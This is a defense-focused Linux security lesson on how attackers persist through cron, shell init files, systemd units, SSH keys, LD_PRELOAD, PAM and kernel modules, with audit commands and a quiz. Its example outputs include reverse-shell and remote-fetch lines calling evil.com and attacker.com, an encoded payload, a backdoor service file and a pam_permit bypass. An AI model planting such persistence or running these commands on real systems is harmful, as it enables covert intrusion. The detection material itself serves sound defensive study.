# Lesson 11: Exploitation — Persistence (DEFENSE FOCUSED)

## History & Origins

Persistence is as old as multi-user computing. In the 1970s, Unix systems used `/etc/rc.local` and cron (V7 Unix, 1979) to schedule recurring tasks. Attackers quickly realized that if they could plant a cron job or modify a startup script, they'd own the box forever.

The arms race has evolved through decades:

- **1970s-80s:** `/etc/rc.local`, `at`, cron — simple startup scripts run at boot or on schedule. These were the first persistence vectors because they were the only way to run code automatically.
- **1990s:** `init.d` scripts, `/etc/inittab`, `~/.bashrc` sourcing — SysV init brought structure, bringing more hiding spots. Attackers learned to modify init scripts and shell profiles.
- **2000s:** SSH authorized_keys, `ld.so.preload`, kernel modules — persistence went low-level. Attackers could now hook every process or hide in the kernel itself.
- **2010s:** systemd services/timers, user-level systemd, Docker mounted sockets — container-era persistence. Attackers abused the new init system and container escape vectors.
- **2020s:** Kubernetes cronjobs, cloud-init scripts, CI/CD pipeline injection, GitHub Actions — persistence moved to the cloud and the software supply chain.

The MITRE ATT&CK framework catalogs persistence under tactic **TA0003** with 19+ techniques. T1547 (Boot or Logon Autostart Execution) alone has 15 sub-techniques including Registry Run Keys, Startup Folder, Login Hook, and Re-opened Applications. Every new init system, daemon manager, and automation framework creates a new potential persistence vector.

The defender's job: know every place an attacker can hide, check them systematically, and detect changes from known-good baselines. You cannot defend what you do not know exists. This lesson is about building that map of persistence terrain.

## Syntax Reference

```
# --- Cron ---
crontab -l                          # List current user's crontab
crontab -u user -l                  # List another user's crontab (root only)
crontab -e                          # Edit current user's crontab
crontab -r                          # Remove current user's crontab
ls -la /var/spool/cron/crontabs/    # All user crontab files (Linux)
cat /etc/crontab                    # System-wide crontab
ls /etc/cron.d/                     # Cron.d snippets directory
ls /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
cat /etc/anacrontab                 # Anacron configuration
grep -r '@reboot' /etc/cron* /var/spool/cron/ 2>/dev/null

# --- Shell Init Files ---
# Per-user order of precedence for login shells:
~/.bash_profile   # Highest precedence
~/.bash_login     # Checked second
~/.profile        # Checked third (sh-compatible fallback)
# Interactive non-login:
~/.bashrc         # Sourced for interactive non-login shells
# Other:
~/.bash_logout    # Runs on logout
~/.pam_environment # Read by pam_env.so at login
# System-wide:
/etc/bash.bashrc
/etc/profile
/etc/profile.d/*.sh

# --- systemd ---
systemctl list-units --type=service --all          # System services
systemctl list-timers --all                         # System timers
systemctl --user list-units --type=service --all    # User services (critical!)
systemctl --user list-timers --all                  # User timers
systemctl cat service-name                          # Show unit file content
systemctl show -p WantedBy service-name             # Show install target
systemctl --user show-environment                   # User systemd env vars
systemctl show-environment                          # System systemd env vars
loginctl show-user $USER                            # Check lingering status
ls ~/.config/systemd/user/                          # User service files (non-root)
ls /etc/systemd/system/                             # System service files

# --- SSH ---
cat ~/.ssh/authorized_keys
sudo cat /root/.ssh/authorized_keys
ls -la ~/.ssh/
grep -r 'ssh-rsa\|ssh-ed25519\|ecdsa' /home/*/.ssh/authorized_keys 2>/dev/null
grep -i authorizedkeysfile /etc/ssh/sshd_config

# --- LD Preload ---
cat /etc/ld.so.preload 2>/dev/null || echo "not set"
ls /etc/ld.so.conf.d/
ldconfig -p | grep -E '^[^/]'  # Show cache
lsof | grep preload 2>/dev/null

# --- Kernel Modules ---
lsmod
modinfo module-name
ls /lib/modules/$(uname -r)/
cat /etc/modules
ls /etc/modules-load.d/
ls /etc/modprobe.d/
lsinitramfs /boot/initrd.img-$(uname -r) 2>/dev/null | grep '\.ko$'

# --- Other Persistence Vectors ---
ls -la /etc/init.d/
ls -la /etc/rc?.d/
cat /etc/inittab 2>/dev/null
cat /etc/rc.local 2>/dev/null
ls -la ~/.config/autostart/           # XDG autostart (GUI)
ls -la /etc/xdg/autostart/
at -l                                 # List at jobs
ls /var/spool/atjobs/ 2>/dev/null
ls /usr/share/dbus-1/system-services/ # D-Bus activated services
ls ~/.local/share/dbus-1/services/
systemctl list-units --type=service --state=-  # Failed/not-found units
systemctl list-unit-files | grep enabled       # All enabled units
```

## Under the Hood (GO DEEP)

### Kernel/OS Mechanics of Persistence

**Cron Internals:** The cron daemon (`crond`) operates as follows:

1. At startup, it reads `/etc/crontab`, scans `/etc/cron.d/`, `/var/spool/cron/crontabs/`, and optionally anacron config.
2. It builds an in-memory schedule of all jobs.
3. Every minute (the default resolution of cron), it wakes up and checks if any jobs' time specifications match the current time.
4. When a match occurs, cron forks. The child process:
   - Drops privileges to the target user (setuid, setgid, initgroups)
   - Closes all FDs beyond stdin/stdout/stderr
   - Changes directory to the user's home
   - Sets environment: `HOME`, `LOGNAME`, `USER`, `SHELL`, `PATH=/usr/bin:/bin`
   - Executes the command via `/bin/sh -c`

**Critical insight:** Cron does NOT source `.bashrc`, `.bash_profile`, or any user shell init files. The environment is minimal. This is why cron jobs using relative paths or shell aliases fail silently. Attackers adapt by using absolute paths and often source their own env files.

**Systemd Service Lifecycle:**

1. PID 1 (systemd) reads unit files from `/etc/systemd/system/`, `/usr/lib/systemd/system/`, `/run/systemd/system/` (in order of precedence).
2. For each unit in `WantedBy=multi-user.target`, systemd starts the service at boot.
3. For `Type=simple`: `ExecStart` is forked, and systemd considers the service "started" immediately. If `ExecStart` exits, `Restart=` policy determines next action.
4. For `Type=oneshot`: systemd waits for `ExecStart` to exit, then considers the service "active (exited)".
5. `Restart=always` re-launches regardless of exit code. `Restart=on-failure` only re-launches on non-zero exit codes.
6. Systemd applies resource limits, sandboxing, and capability bounding sets based on unit file settings.

**User vs. System systemd:**
- System systemd runs as PID 1, is root, controls hardware, mounts, core services.
- User systemd (`systemd --user`) runs as the user, starts when the user logs in (or earlier if lingering is enabled).
- User systemd communicates over the user's D-Bus socket at `/run/user/$UID/bus`.
- User services are NOT visible in system-wide `systemctl list-units`.

**LD_PRELOAD Dynamic Linking Mechanism:**

When a dynamically-linked executable starts, the kernel loads the ELF binary and the dynamic linker (`ld-linux.so.2` for 32-bit, `ld-linux-x86-64.so.2` for 64-bit). The dynamic linker:

1. Reads `/etc/ld.so.preload` — if it exists and is non-empty, it maps the listed libraries into memory.
2. Checks the `LD_PRELOAD` environment variable — if set, maps those libraries.
3. Processes the program's DT_NEEDED entries from the ELF dynamic section.
4. Resolves symbols using the standard search order: preloaded libraries first, then DT_NEEDED in order.

Because preloaded libraries are loaded first, they get first chance to resolve symbols. If a preloaded library exports `open()`, every call to `open()` in the program (and its libraries) resolves to the preloaded version. The original `open()` in libc is still accessible via `dlsym(RTLD_NEXT, "open")` — if the hook wants to call it.

**Kernel Module Loading Path:**

The `init_module()` syscall loads a kernel module from user-space memory. The kernel:

1. Validates the ELF structure of the module.
2. Copies it into kernel memory.
3. Checks module signature if `CONFIG_MODULE_SIG` is enabled (common on modern distros, but the signature can be added to the MOK list by an attacker with access).
4. Resolves the module's symbol references against the kernel's exported symbol table (remember, modern kernels don't export all symbols — only those in `EXPORT_SYMBOL` or `EXPORT_SYMBOL_GPL`).
5. Calls the module's `init` function.
6. Adds the module to the internal kernel module list (visible via `/proc/modules`).

A malicious module can:
- Modify the syscall table (if it can find it — KASLR and CR0.WP protection make this harder on modern kernels)
- Hook VFS operations to hide files
- Hook `/proc` read operations to hide processes
- Modify network packet handlers
- All of this at ring 0 with full access to physical memory

### What strace Reveals

```bash
# Cron reads user crontab files — notice the direct file access
$ strace -f crontab -l 2>&1 | head -20
openat(AT_FDCWD, "/var/spool/cron/crontabs/user", O_RDONLY) = 3
read(3, "# Edit this file to introduce tasks...", 4096) = 422

# systemd --user communicates over the USER D-Bus socket
$ strace -f systemctl --user list-units 2>&1 | grep -E 'connect|sendto'
connect(3, {sa_family=AF_UNIX, sun_path="/run/user/1000/bus"}, 30) = 0

# Every binary checks ld.so.preload at startup
$ strace -f bash -c 'ls' 2>&1 | grep preload
openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_CLOEXEC) = -1 ENOENT
# ENOENT is the expected "secure" state. A file descriptor means compromise.

# Kernel module loading
$ sudo strace modprobe usb-storage 2>&1 | grep finit_module
finit_module(3, "", 0) = 0
```

### Security Model Interactions

**SELinux/AppArmor:** Linux Security Modules confine what processes can do regardless of UID. For persistence this means:
- A cron job running as root but confined to `crond_t` may not write to `/etc/shadow`
- systemd sandboxing: `ProtectSystem=strict` makes `/usr` and `/etc` read-only for the service
- `NoNewPrivileges=true` prevents the service (or anything it execs) from gaining new privileges via setuid binaries
- Attackers check LSM policy and may need to find escapes (e.g., `pam_namespace` for SELinux escapes)

**User Namespaces:** Since Linux 3.8, unprivileged user namespaces let a regular user create an environment where they are root. The user can:
- Mount filesystems, create device nodes
- Have `CAP_NET_ADMIN`, `CAP_SYS_ADMIN` inside the namespace
- Create their own PID namespace (processes invisible to host)
This enables persistence that's invisible to host-level monitoring.

**Immutable + Append-Only Files:** `chattr +i` (immutable) and `chattr +a` (append-only) on ext4/xfs:
- Immutable: cannot be modified, deleted, renamed, or linked
- Append-only: can only be opened in append mode
- These require `CAP_LINUX_IMMUTABLE` to change — root has it, but SELinux can restrict it

### Process/Memory Implications

**Short-lived persistence (cron, systemd oneshot, at):**
- Process exists for seconds, then exits
- Hard to catch with `ps` sampling (window between checks)
- Leaves no memory-resident footprint
- Best detected via file integrity monitoring (the script or job definition persists)

**Long-lived persistence (systemd simple services, LD_PRELOAD, kernel modules):**
- Process/library stays in memory continuously
- Visible in `ps`, `lsmod`, `/proc` (unless hidden by rootkit)
- Occupies RAM, CPU time (if active), potentially degrades system performance
- LD_PRELOAD adds library loading overhead to every process launch
- Kernel modules consume kernel memory (not swappable) — if buggy, can crash the system

## Core Examples (15 total)

### Example 1: Cron — Full system crontab enumeration

```bash
$ echo "=== /etc/crontab ===" && cat /etc/crontab
$ echo "=== /etc/cron.d/ ===" && for f in /etc/cron.d/*; do [ -f "$f" ] && echo "--- $f ---" && cat "$f"; done
$ echo "=== User crontabs ===" && for f in /var/spool/cron/crontabs/*; do [ -f "$f" ] && echo "--- $(basename $f) ---" && cat "$f"; done
```

**Anatomy:** System crontab uses 6-column format: minute, hour, day, month, weekday, user, command. User crontabs use 5-column (no user field). Cron.d files use 6-column like system crontab.

**Variations:** Some distros also use `/etc/cron.hourly/` which contains scripts (run by `run-parts`), not crontab-formatted files. These are different mechanisms!

**Edge case:** A crontab with `000` permissions still runs (cron reads it as root) but `crontab -l` fails. Always `sudo cat` directly.

### Example 2: Cron — @reboot detection

```bash
$ grep -r '@reboot' /etc/cron* /var/spool/cron/ 2>/dev/null
```

**Output if compromised:**
```
/var/spool/cron/crontabs/user:@reboot /home/user/.local/bin/updater
/etc/cron.d/malware:@reboot root /opt/.hidden/checkin
```

**Anatomy:** `@reboot` replaces the 5 time fields. Runs once when cron starts. In system crontab, requires username as 6th field.

**Edge case:** `@reboot` runs when cron starts, not when the system boots. If systemd restarts cron (e.g., after a crash), `@reboot` fires again. Multiple triggers possible if cron crashes repeatedly.

### Example 3: Shell init — Full user scan

```bash
$ for user_home in /root /home/*; do
    user=$(basename "$user_home")
    for f in .bashrc .bash_profile .profile .bash_login; do
      [ -f "$user_home/$f" ] && echo "$user/$f ($(wc -l < "$user_home/$f") lines)"
    done
  done
```

**Output:**
```
alice/.bashrc (142 lines)
alice/.bash_profile (3 lines)
bob/.bashrc (12 lines)
```

**Anatomy:** Login shells read the FIRST found of `.bash_profile`, `.bash_login`, `.profile`. If `.bash_profile` exists, `.profile` is IGNORED. Attackers exploit this: plant in `.bash_profile`, leave `.profile` clean.

**Edge case:** `BASH_ENV` environment variable is sourced for ALL bash invocations (even non-interactive, non-login) when bash is invoked as `sh`. This is a common trap.

### Example 4: Shell init — Suspicious pattern detection

```bash
$ grep -rnE '(curl|wget|nc |/dev/tcp|bash -i|eval.*\$\(|base64 -d)' /home/*/.*bash* /root/.*bash* 2>/dev/null
```

**Output if compromised:**
```
/home/user/.bashrc:15:eval "$(curl -s http://evil.com/x)"
/home/user/.bashrc:22:nc -e /bin/bash attacker.com 4444 &
```

**Variations:** Base64 encoded: `eval "$(echo 'Y3VybCAtcyBodHRwOi8vZXZpbC5jb20veA==' | base64 -d)"`. DNS TXT: `eval "$(dig +short txt payload.evil.com)"`. Aliases: `alias ls='ls $@; curl http://evil.com/x | bash'`.

**Edge case:** grep pattern has false positives. Developers use `curl` and `wget` legitimately. Look for DESTINATION of the output — is it being piped to a shell?

### Example 5: systemd — User service enumeration

```bash
$ systemctl --user list-units --type=service --all
```

**Output (compromised):**
```
UNIT                       LOAD   ACTIVE SUB     DESCRIPTION
backdoor.service           loaded active running System Update
legit.service              loaded active exited  Legit App
```

**Anatomy:** The critical point: `systemctl` without `--user` does NOT show these. Always run both.

**Edge case:** `systemctl --user` requires D-Bus session bus. In cron/SSH, `XDG_RUNTIME_DIR` may not be set. Check with: `XDG_RUNTIME_DIR=/run/user/$UID systemctl --user list-units`.

### Example 6: systemd — Service file inspection

```bash
$ systemctl --user cat backdoor.service
```

**Output:**
```
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/home/user/.local/bin/.updater
Restart=always
RestartSec=60
Nice=19

[Install]
WantedBy=default.target
```

**Anatomy:** `Restart=always` re-launches the binary if killed. `Nice=19` makes it almost invisible in top (sort by CPU usage). `After=network.target` waits for network.

**Edge case:** `Type=simple` means systemd thinks the service started immediately. If the binary exits, systemd restarts. If it's `Type=oneshot`, systemd waits and the service shows as "exited".

### Example 7: SSH authorized_keys — System audit

```bash
$ for d in /root /home/*; do
    f="$d/.ssh/authorized_keys"
    [ -f "$f" ] && echo "$(basename $d): $(wc -l < $f) keys, perms $(stat -c '%a' $f)"
  done
```

**Output:**
```
alice: 3 keys, perms 600
root: 1 key, perms 644   # WRONG — should be 600!
```

**Anatomy:** Permissions 600 are required. SSH ignores authorized_keys that are group/world-writable. Check permissions religiously.

**Edge case:** SSH config `AuthorizedKeysFile` can point to multiple files. Also check `~/.ssh/authorized_keys2` and `~/.ssh/rc`. The `command=` option in authorized_keys forces a specific command — a backdoor key can alias itself.

### Example 8: LD_PRELOAD — Detection

```bash
$ cat /etc/ld.so.preload 2>/dev/null || echo "Empty/not set — secure"
```

**Output if compromised:**
```
/usr/lib/libprocesshider.so
```

**Anatomy:** File contains one or more absolute paths to shared libraries. If it exists and is non-empty, those libraries load into every process. This is ALWAYS suspicious on production systems.

**Variations:** Check environment-based preloads too:
```bash
$ sudo systemctl show-environment | grep PRELOAD
$ grep -r PRELOAD /etc/systemd/ /etc/environment /etc/security/pam_env.conf 2>/dev/null
$ cat ~/.pam_environment 2>/dev/null | grep PRELOAD
```

### Example 9: LD_PRELOAD — Library verification

```bash
$ nm -DC /usr/lib/libprocesshider.so 2>/dev/null | grep ' T '
```

**Output if hooking:**
```
0000000000001234 T open
0000000000001256 T open64
0000000000001289 T readdir
0000000000001301 T stat
0000000000001322 T lstat
0000000000001340 T connect
```

**Anatomy:** `T` means defined in text (code) section. These are hooked syscall wrappers. Legitimate preload libraries (like `fakeroot`, `libeatmydata`) have specific expected symbols.

**Edge case:** A library can run code via ELF init/fini sections without exporting hooked symbols. Check with `readelf -d /lib/evil.so | grep -E 'INIT|FINI'`.

### Example 10: Kernel module enumeration

```bash
$ lsmod | head
$ modinfo suspicious_module 2>/dev/null
```

**Output if suspicious:**
```
Module                  Size  Used by
suspicious_module       16384  0

$ modinfo suspicious_module
filename:       /lib/modules/$(uname -r)/suspicious_module.ko
license:        GPL
description:    (none)         # <— empty description is suspicious
author:         (none)         # <— no author
```

**Anatomy:** Legitimate modules have author, description, and come from known packages.

**Edge case:** Rootkits can hide from `lsmod`. Check `/sys/module/` — if a module is loaded, it has a directory there even if hidden from `lsmod`.

### Example 11: XDG autostart — GUI persistence

```bash
$ cat ~/.config/autostart/update-checker.desktop
```

**Output:**
```
[Desktop Entry]
Type=Application
Name=Update Checker
Exec=/home/user/.local/bin/updater
X-GNOME-Autostart-enabled=true
```

**Anatomy:** Desktop entry files in `~/.config/autostart/` are run by the DE at session start. Key field: `Exec=`.

**Edge case:** Only works in GUI sessions. Headless servers are immune. But developer workstations: prime target.

### Example 12: at jobs

```bash
$ at -l
```
**Output:**
```
42      Wed Aug  2 10:00:00 2026 a user
```

**Anatomy:** `at` runs a command once at a future time. Jobs in `/var/spool/atjobs/`. Chainable: an at job can schedule another at job.

**Edge case:** at jobs survive reboots (they're in /var/spool, which persists). Unlike cron, there's no `at -r` for removing others' jobs (root only).

### Example 13: PAM backdoor detection

```bash
$ grep -rn 'pam_permit\|pam_rootok\|pam_listfile\|nullok' /etc/pam.d/ 2>/dev/null
```

**Output if compromised:**
```
/etc/pam.d/sshd: auth sufficient pam_permit.so
```

**Anatomy:** `pam_permit.so` always succeeds. `sufficient` means skip remaining modules. This bypasses password authentication entirely.

**Edge case:** Check BOTH `/etc/pam.d/` and `/etc/pam.conf`. Custom PAM modules in `/lib/security/` or `/lib/x86_64-linux-gnu/security/`.

### Example 14: rc.local persistence

```bash
$ cat /etc/rc.local 2>/dev/null
```

**Output if compromised:**
```
#!/bin/sh
/usr/local/bin/legit-service
/root/.hidden/payload.sh &
exit 0
```

**Anatomy:** Runs at the end of boot on SysV init. On systemd, enabled via `rc-local.service`. The `exit 0` is required.

**Edge case:** `rc-local.service` is often DISABLED by default on modern distros. Check `systemctl status rc-local`.

### Example 15: Environment variable persistence (systemd)

```bash
$ sudo systemctl show-environment
```
**Output if compromised:**
```
LD_PRELOAD=/usr/lib/libhack.so
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/.bin
```

**Anatomy:** systemd's `DefaultEnvironment` can set `LD_PRELOAD` for ALL system services. This is invisible to the usual `/etc/ld.so.preload` check.

**Edge case:** `Ground Environment` directives in individual service files can also set `LD_PRELOAD`. Check with `grep -r LD_PRELOAD /etc/systemd/`.

## Real-World Use Cases

### FOR the OS

- Cron for log rotation, daily system updates, temp file cleanup
- systemd services for nginx, PostgreSQL, SSH daemon
- SSH authorized_keys for Ansible automation and rsync
- LD_PRELOAD for `libeatmydata` (skip fsync for testing), `fakeroot`, `libfaketime`
- Kernel modules for hardware drivers (USB, graphics, storage)

### WITH the OS

- Cron health checks: every 5 minutes test HTTP endpoint, restart service if down
- systemd timers for periodic database backups with `Persistent=true`
- inotify + systemd path units to trigger actions on file changes
- udev rules to auto-mount USB drives (covered in Lesson 15)
- D-Bus activation for on-demand services

### AGAINST the OS

- Cron-based crypto miners with `@reboot` persistence
- SSH authorized_keys backdoors for long-term access
- LD_PRELOAD rootkits (Jynx2, Azazel) hooking `open()` and `getdents64()` to hide files
- Kernel rootkits (Diamorphine, Reptile) for ring-0 persistence, hiding processes and network connections
- systemd user services for persistence that evades system-wide monitoring
- PAM backdoors for password bypass
- Cloud-init scripts that add SSH keys to AWS/GCP instances

### FOR DEFENSE

- `chattr +i` on `/etc/crontab`, `/etc/shadow`, `/etc/passwd`, `/etc/ld.so.preload`
- SELinux/AppArmor policies confining cron, systemd, user sessions
- auditd rules watching all persistence-related paths
- Kernel module signing with custom MOK key (only your signed modules load)
- Immutable `/etc` with `mount -o remount,ro /etc` on hardened systems
- Remote syslog for tamper-proof logging
- File integrity monitoring with AIDE/Tripwire or `sha256sum -c` baselines
- Read-only rootfs with overlayfs for factory-reset detection

## Memory Aids

**"FIVE LAYERS"** — Where persistence hides:
1. **F**ilesystem — cron, systemd units, rc scripts, at jobs
2. **I**nitialization — .bashrc, .profile, PAM
3. **V**erification — authorized_keys, PAM config
4. **E**xecution — LD_PRELOAD, kernel modules
5. **L**ow-level — firmware, UEFI, BMC, GPU

**"CRON SSH KERN"** — Check priority order:
- **C**ron (all locations)
- **R**C scripts and init
- **O**ther: systemd timers, at, anacron
- **N**etwork: SSH keys, web shells
- **S**hell init files
- **S**ystemd services (system + user)
- **H**ooks: LD_PRELOAD, PAM, udev
- **K**ernel modules
- **E**nvironment variables
- **R**ootkits (hardware/firmware)

**The 7 P's:** Prior Proper Preparation Prevents Piss-Poor Persistence Detection — always check all 7 locations before declaring a system clean.

## Trap Vault (15 traps)

**Trap 1:** `/etc/cron.daily/` scripts DON'T run at a fixed time — they run via `anacron` which may run hours late. The exact run time depends on when the system is next powered on.

**Trap 2:** User systemd services (`~/.config/systemd/user/`) are NOT shown by `systemctl list-units` without `--user`. ALWAYS run `systemctl --user list-units` in audits.

**Trap 3:** `crontab -e` respects `$VISUAL`/`$EDITOR`. If an attacker sets these in `.bashrc` to a malicious script, they get code execution when root runs `crontab -e`.

**Trap 4:** `@reboot` fires when cron STARTS, not when the system boots. If cron is restarted (upgrade, crash), `@reboot` jobs run again — potentially multiple times.

**Trap 5:** `LD_PRELOAD` via environment variable is INVISIBLE to `cat /etc/ld.so.preload`. Check systemd environment, PAM env files, and per-service `Environment=` directives.

**Trap 6:** SSH authorized_keys `command=` option: `command=/usr/local/bin/restricted-shell ssh-rsa AAA...` — this forces a specific command when the key is used, making it invisible to `sudo -l` checks.

**Trap 7:** If `.bash_profile` exists, `.profile` is NEVER read by login shells. Attackers plant in `.bash_profile` and leave `.profile` clean as a decoy.

**Trap 8:** Kernel modules in initramfs DO NOT appear in `/etc/modules` or `/etc/modprobe.d/`. Check with `lsinitramfs | grep '\.ko$'`.

**Trap 9:** Anacron on laptops runs missed jobs on wake. A persistence mechanism that failed to run during sleep will fire when the lid opens.

**Trap 10:** `~/.pam_environment` uses `KEY=VALUE` format (NOT a shell script). An attacker can set `LD_PRELOAD` here without touching `/etc/ld.so.preload` or any bash init file.

**Trap 11:** `systemd-tmpfiles` config in `/etc/tmpfiles.d/` or `~/.config/user-tmpfiles.d/` can create files/directories symlinks on every boot. Attacker recreates deleted persistence files.

**Trap 12:** `.bash_logout` runs on shell exit. Used by attackers to clear `~/.bash_history`, delete temp files, or run cleanup after using a backdoor.

**Trap 13:** udev rules can run scripts when devices are plugged. Physical access attacker triggers persistence install via USB insertion.

**Trap 14:** `logrotate` postrotate scripts run as the log owner (often root). A crafted logrotate config in `/etc/logrotate.d/` gives periodic root code execution.

**Trap 15:** D-Bus activation services in `~/.local/share/dbus-1/services/` launch auto-start when a D-Bus message matches. No cron, no systemd service needed.

## See It In The Wild

- **APT group "Stratsec":** Maintained SSH access by rotating authorized_keys every 72 hours. If one key was compromised, it was already rotated.

- **CoinMiner malware:** Used `@reboot` in user crontabs with a downloader script. The script checked for the miner binary and re-fetched it from a Pastebin URL if missing.

- **Jynx2 LD_PRELOAD rootkit:** Hooked 15 libc functions including `open()`, `readdir()`, `stat()`, `lstat()`, `connect()` to hide itself from `ls`, `lsof`, `netstat`, and `ps`.

- **Tsunami DDoS bot:** Used systemd user services with randomized names ("syslog-ng", "dbus-daemon-user", "pipewire-session") and `Restart=always`. Service files were in `~/.config/systemd/user/`.

- **TeamTNT (Cloud cryptomining):** Added SSH keys, modified cloud-init scripts, installed systemd services with `Restart=always`. They specifically targeted Kubernetes clusters and Docker hosts.

- **PAM backdoor (SSHDoor):** Added `pam_permit.so` as `sufficient` for a specific backdoor username pattern. Normal users authenticated normally — no suspicious behavior visible.

- **Malo rootkit:** Kernel module rootkit that hooked the syscall table to hide files, processes, and network connections. It also intercepted `write()` to clean its own entries from log files.

## Check Your Understanding (10 questions)

1. **Q:** List six different cron-based persistence locations on a standard Linux system. **A:** `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/crontabs/*`, `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/anacrontab`.

2. **Q:** Why is `systemctl --user` persistence harder to detect than system-wide systemd persistence? **A:** User services don't appear in `systemctl list-units` (without `--user`). They run with user privileges, don't need root, survive logouts (with lingering), and are in user-owned directories less likely to be monitored.

3. **Q:** How does `LD_PRELOAD` achieve persistence without modifying any files on disk? **A:** It doesn't need to modify binaries — it just needs to write a library path. The library is loaded into every process's address space before libc, hooking standard functions (open, execve, readdir) to intercept and modify behavior.

4. **Q:** What's the key difference between cron and at for persistence? **A:** Cron is recurring (runs on schedule forever). At is one-shot (runs once). But at can chain: job A schedules job B, job B schedules job C, creating a moving-target persistence harder to detect.

5. **Q:** How does `chattr +i` defend against persistence, and how can an attacker bypass it? **A:** Makes files immutable — even root can't modify. Bypass: `chattr -i` (needs CAP_LINUX_IMMUTABLE) or use a persistence vector that doesn't need to modify protected files (user home dir, env vars, LD_PRELOAD).

6. **Q:** Why do cron jobs often fail with "command not found" even though the command works in an interactive shell? **A:** Cron sets `PATH=/usr/bin:/bin` — much more minimal than interactive PATH (which includes `/usr/local/bin`, `~/bin`, etc.). Always use absolute paths in cron.

7. **Q:** How would you detect an LD_PRELOAD rootkit that doesn't use `/etc/ld.so.preload`? **A:** Check `systemctl show-environment`, `grep -r LD_PRELOAD /etc/systemd/`, check `~/.pam_environment`, check `Environment=` directives in all service files, check `BASH_ENV` and similar vars.

8. **Q:** What does `loginctl enable-linger` do, and why is it relevant to persistence detection? **A:** It keeps the user's systemd instance running after all sessions log out. User services continue to run even when the user is "logged out." If a service account (not a real user) has lingering enabled, that's suspicious.

9. **Q:** How do you detect kernel modules that are loaded but hidden from `lsmod`? **A:** Check `/sys/module/` — loaded modules always have a directory there. Compare against `lsmod` output. If a directory exists in `/sys/module/` but not in `lsmod`, you've found a hidden module.

10. **Q:** Why are world-writable cron scripts flagged as HIGH severity? **A:** Any user with write access to a script executed by a cron job (especially root's cron) can inject arbitrary commands. This is a direct privilege escalation vector from unprivileged user to root.
